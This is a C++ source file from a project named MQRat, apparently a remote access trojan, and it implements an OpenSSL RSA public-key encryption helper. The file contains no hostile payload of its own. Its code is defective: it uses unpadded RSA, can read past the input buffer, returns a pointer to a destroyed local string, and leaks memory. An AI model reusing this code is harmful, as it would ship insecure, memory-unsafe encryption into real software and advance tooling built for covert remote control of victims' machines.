/*
	This file is part of MQRat.
	
	Copyright (C) 2019  MQRat Project

	O autor não se responsabiliza por variantes (ou sources originais) deste software 
	que estejam sendo utilizadas para prejudicar terceiros.
*/

#include <openssl/rsa.h>
#include <openssl/pem.h>
#include <openssl/err.h>
#include <openssl/pkcs12.h>
#include <openssl/pkcs12err.h>
#include "encoders/base64.hpp"
#include <stdexcept>
#include <cassert>
#include <cstring>
#include "crypto.hpp"

Crypto::RSACipher::RSACipher()
{
    ERR_load_crypto_strings();
    ERR_free_strings();

    rsa_ctx = nullptr;
}

Crypto::RSACipher::~RSACipher()
{
    
}

void *Crypto::RSACipher::LoadPublicKey(const char *buffer, size_t len)
{
    BIO *bio = nullptr;
    RSA *rsa = nullptr;

    bio = BIO_new(BIO_s_mem());
    if(!bio) {
        throw std::runtime_error("Failed to initialize BIO memory buffer");
    }

    BIO_write(bio, buffer, len);

    rsa = PEM_read_bio_RSA_PUBKEY(bio, &rsa, NULL, NULL);
    if(!rsa) {
        ERR_print_errors_fp(stdout);
        BIO_free_all(bio);
        throw std::runtime_error("Failed to read bio pubkey");
    }

    // Setup RSA context variable
    this->rsa_ctx = rsa;

    return rsa;
}

const char *Crypto::RSACipher::Encrypt(void *buffer, size_t len)
{
    std::string s_encryptedBuffer;

    // Make sure that public key is loaded
    assert(this->rsa_ctx != nullptr);

    // Allocates memory to store encrypted data
    auto rsa_size = RSA_size(static_cast<RSA*>(this->rsa_ctx));
    auto encryptedBuffer = new unsigned char[rsa_size]; 

    std::memset(encryptedBuffer, 0, rsa_size);

    printf("[INFO] %d bytes of memory allocated\n", rsa_size);

    auto rsa = static_cast<RSA*>(this->rsa_ctx);

    // Encrypt data
    auto encrypted_size = RSA_public_encrypt(rsa_size, 
                    (const unsigned char *)buffer, 
                    encryptedBuffer,
                    rsa, RSA_NO_PADDING);

    // Check for error
    if(encrypted_size > 0) {
        // Encode encrypted data to base64
        s_encryptedBuffer = base64_encode(encryptedBuffer, encrypted_size);
    } else {

        auto err = ERR_error_string(ERR_get_error(), nullptr);
        throw std::runtime_error(std::string(err));
    }

    printf("encrypted size: %d\n", encrypted_size);
    printf("encrypted data: %s\n", s_encryptedBuffer.c_str());

    return s_encryptedBuffer.c_str();
}

void *Crypto::RSACipher::GetRSAContext()
{
    return this->rsa_ctx;
}
